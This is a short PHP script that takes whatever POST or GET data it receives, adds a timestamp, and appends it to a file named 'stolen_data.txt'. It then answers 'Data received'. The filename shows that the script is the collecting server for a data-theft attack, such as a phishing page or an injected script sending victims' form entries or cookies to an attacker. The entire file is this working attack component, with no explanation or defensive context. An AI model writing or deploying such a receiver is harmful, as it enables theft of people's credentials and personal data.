<?php
$data = $_POST ?: $_GET;

if (!empty($data)) {
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[$timestamp] Data: " . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n\n";
    
    file_put_contents('stolen_data.txt', $log_entry, FILE_APPEND);
    
    http_response_code(200);
    echo "Data received";
} else {
    http_response_code(400);
    echo "No data provided";
}
?>